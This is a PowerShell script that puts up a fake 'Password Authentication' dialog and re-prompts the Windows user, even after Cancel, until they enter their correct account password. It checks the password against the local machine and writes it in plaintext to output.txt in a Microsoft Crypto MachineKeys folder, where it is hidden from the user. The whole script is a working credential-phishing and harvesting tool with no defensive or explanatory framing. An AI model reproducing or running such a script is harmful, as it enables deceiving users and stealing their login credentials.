Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.DirectoryServices.AccountManagement

function Show-PasswordPrompt {
    $form = New-Object System.Windows.Forms.Form
    $form.Text = "Password Authentication"
    $form.Size = New-Object System.Drawing.Size(300,150)
    $form.StartPosition = "CenterScreen"

    $username = [Environment]::UserName

    $label = New-Object System.Windows.Forms.Label
    $label.Text = "Enter your password:"
    $label.Location = New-Object System.Drawing.Point(10,20)
    $label.Size = New-Object System.Drawing.Size(280,20)
    $form.Controls.Add($label)

    $textBox = New-Object System.Windows.Forms.TextBox
    $textBox.Location = New-Object System.Drawing.Point(10,40)
    $textBox.Size = New-Object System.Drawing.Size(265,20)
    $textBox.UseSystemPasswordChar = $true
    $form.Controls.Add($textBox)

    $okButton = New-Object System.Windows.Forms.Button
    $okButton.Location = New-Object System.Drawing.Point(10,70)
    $okButton.Size = New-Object System.Drawing.Size(75,23)
    $okButton.Text = "OK"
    $okButton.DialogResult = [System.Windows.Forms.DialogResult]::OK
    $form.AcceptButton = $okButton
    $form.Controls.Add($okButton)

    $cancelButton = New-Object System.Windows.Forms.Button
    $cancelButton.Location = New-Object System.Drawing.Point(95,70)
    $cancelButton.Size = New-Object System.Drawing.Size(75,23)
    $cancelButton.Text = "Cancel"
    $cancelButton.DialogResult = [System.Windows.Forms.DialogResult]::Cancel
    $form.CancelButton = $cancelButton
    $form.Controls.Add($cancelButton)

    $result = $form.ShowDialog()

    if ($result -eq [System.Windows.Forms.DialogResult]::OK) {
        $password = $textBox.Text
        Validate-Credentials -username $username -password $password
    } elseif ($result -eq [System.Windows.Forms.DialogResult]::Cancel) {
        Write-Host "Operation canceled by the user."
        Write-Host "trying again"
        Show-PasswordPrompt
    }

    $form.Dispose()
}

function Validate-Credentials {
    param(
        [string]$username,
        [string]$password
    )
    $contextType = [System.DirectoryServices.AccountManagement.ContextType]::Machine
    try {
        $principalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext($contextType)
        $isValid = $principalContext.ValidateCredentials($username, $password)
        if ($isValid) {
            Write-Host "Authentication successful."
            $directoryPath = "C:\ProgramData\Microsoft\Crypto\DSS\MachineKeys"
            $fileName = "output.txt"
            $content = $password
            Output-File -directoryPath $directoryPath -fileName $fileName -content $content
        } else {
            Write-Host "Authentication failed. Please try again."
            Show-PasswordPrompt
        }
    } catch {
        Write-Host "An error occurred: $_"
    }
}

function Output-File {
    param(
        [string]$directoryPath,
        [string]$fileName,
        [string]$content
    )

    # Ensure the directory exists
    if (-Not (Test-Path -Path $directoryPath)) {
        New-Item -ItemType Directory -Path $directoryPath -Force
    }

    $filePath = Join-Path -Path $directoryPath -ChildPath $fileName
    $content | Out-File -FilePath $filePath -Encoding UTF8
}


Show-PasswordPrompt
